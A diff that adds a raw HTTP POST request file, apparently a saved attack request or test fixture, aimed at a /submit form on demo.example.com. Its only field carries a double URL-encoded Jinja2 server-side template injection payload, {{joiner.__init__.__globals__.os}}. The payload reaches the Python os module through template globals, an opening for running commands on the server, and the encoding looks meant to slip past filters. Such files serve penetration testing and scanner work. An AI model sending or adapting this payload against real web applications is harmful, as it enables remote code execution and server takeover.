@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Connection: close
+
+url=%257B%257Bjoiner.__init__.__globals__.os%257D%257D
